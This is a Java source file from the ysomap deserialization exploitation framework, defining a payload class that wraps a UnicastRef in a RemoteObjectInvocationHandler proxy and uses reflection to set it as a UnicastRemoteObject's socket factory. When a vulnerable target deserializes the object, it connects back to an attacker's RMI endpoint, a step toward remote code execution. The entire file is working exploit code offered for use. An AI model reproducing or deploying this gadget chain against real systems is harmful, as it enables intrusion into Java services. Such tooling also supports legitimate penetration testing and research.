package ysomap.core.payload.java.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.rmi.RMIConnectBullet;
import ysomap.core.util.ReflectionHelper;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

/**
 * @author wh1t3P1g
 * @since 2020/3/3
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Require(bullets = {"RMIConnectBullet"})
@Dependencies({"return a UnicastRemoteObject object", "not working for rmi"})
@Authors({ Authors.WH1T3P1G })
public class RMIConnectWithUnicastRemoteObject extends Payload<UnicastRemoteObject> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UnicastRef;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new RMIConnectBullet();
    }

    @Override
    public UnicastRemoteObject pack(Object obj) throws Exception {
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) obj);
        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(),// classloader
                new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
                handler// RemoteObjectInvocationHandler
                );
        // UnicastRemoteObject constructor is protected. It needs to use reflections to new a object
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
        constructor.setAccessible(true);
        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
        ReflectionHelper.setFieldValue(remoteObject, "ssf", serverSocketFactory);
        return remoteObject;
    }

}
